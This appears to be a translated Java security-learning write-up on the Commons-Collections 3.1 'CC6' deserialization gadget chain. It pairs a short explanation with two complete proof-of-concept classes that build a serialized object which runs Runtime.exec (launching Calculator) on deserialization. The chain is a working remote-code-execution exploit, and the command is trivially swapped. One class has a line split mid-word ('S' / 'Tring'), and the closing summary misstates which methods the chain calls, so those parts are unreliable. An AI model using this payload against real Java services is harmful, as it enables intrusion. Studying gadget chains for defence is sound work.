# Java Security Learning-Commons-Collections6 Chain

Author: H3rmesk1t

#Environmental construction
> 1. `JDK` version: JDK1.8u66 (no limit yet)
> 2. `Commons-Collections` version: 3.1

> Use `maven` to build it. First create a `Maven` project without selecting any `Maven` template. The content in `pom.xml` is as follows. Then select the update on the right and let it automatically import the package.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>commons-collections</artifactId>
    <version>1.0-SNAPSHOT</version>

    <dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
    </dependencies>

</project>
```

# Pre-knowledge
## HashSet
> `HashSet` is an unordered collection of duplicate elements that are not allowed. It is essentially implemented by `HashMap`. Like `HashMap`, it is an array that stores linked lists. The elements in `HashSet` are stored on the key of `HashMap`, and the values ​​in `value` are all unified `private static final Object PRESENT = new Object();`. In the `readObject` method of `HashSet`, the `put` method of its internal `HashMap` is called and the value is placed on the `key`

<img src="./images/17.png" alt="">

# CommonsCollections6 Analysis
> In `CommonsCollections5`, the call to the `TiedMapEntry#toString` method is triggered, and then the `LazyMap#get` is triggered to complete the call in the second half; in `CommonsCollections6`, the call to `TiedMapEntry#getValue` is triggered through `TiedMapEntry#hashCode`, but a point that triggers the `hashcode()` method needs to be found. Therefore, the HashSet()` method in the pre-knowledge is used to trigger the `hashCode()` method.

> In the `HashSet#readObject` method, follow up the `put()` method, enter the `java.util.HashMap` call the `put()` method, then call the `hash()` method, and then call `key.hashCode()`. Here you only need to let `key` be the `TiedMapEntry` object.

<img src="./images/18.png" alt="">

<img src="./images/19.png" alt="">

> However, in actual use, one problem needs to be solved, that is, the problem of triggering command execution when calling the `put` method. P Bull's solution to this is `outerMap.remove("h3rmesk1t");`, which also triggers command execution when deserialization is successfully deserialized.

```java
package CommonsCollections6;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.util.HashMap;
import java.util.Map;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/30 4:38 pm
 */
public class FakeDemo {

    public static void fakeDemo() throws IOException, ClassNotFoundException {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map hashMap = new HashMap();
        Map map = LazyMap.decorate(hashMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(map, "h3rmesk1t");
        Map expMap = new HashMap();
        expMap.put(tiedMapEntry, "d1no");
        map.remove("h3rmesk1t");

        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(expMap);
            objectOutputStream.close();

            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
            objectInputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(S
Tring[] args) {
        try {
            fakeDemo();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

<img src="./images/20.png" alt="">

<img src="./images/21.png" alt="">

## POC
> In order to solve the above problems, when constructing `LazyMap`, first construct a `fakeTransformers` object, and when the `Payload` is finally generated, then use reflection to replace the real `transformers`.

```java
package CommonsCollections6;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/30 4:29 pm
 */
public class CommonsCollections6Gadget1 {

    public static void CC6() throws IllegalAccessException, NoSuchFieldException {
        Transformer[] fakeTransformers = new Transformer[] {};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);

        Map hashMap = new HashMap();
        Map map = LazyMap.decorate(hashMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(map, "h3rmesk1t");
        Map expMap = new HashMap();
        expMap.put(tiedMapEntry, "d1no");
        map.remove("h3rmesk1t");
        Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chainedTransformer, transformers);
        //map.clear();

        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(expMap);
            objectOutputStream.close();

            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
            objectInputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            CC6();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

<img src="./images/22.png" alt="">

# Call chain

```java
HashSet.readObject()/HashMap.readObject()
    HashMap.put()
        HashMap.hash()
            TiedMapEntry.hashCode()
                LazyMap.get()
                    ChainedTransformer.transform()
                        InvokerTransformer.transform()
```

# Summarize
> Deserialize the `toString` method of `TiedMapEntry`, indirectly call the `hashCode` method of `LazyMap`, triggering the subsequent `Transformer` malicious execution chain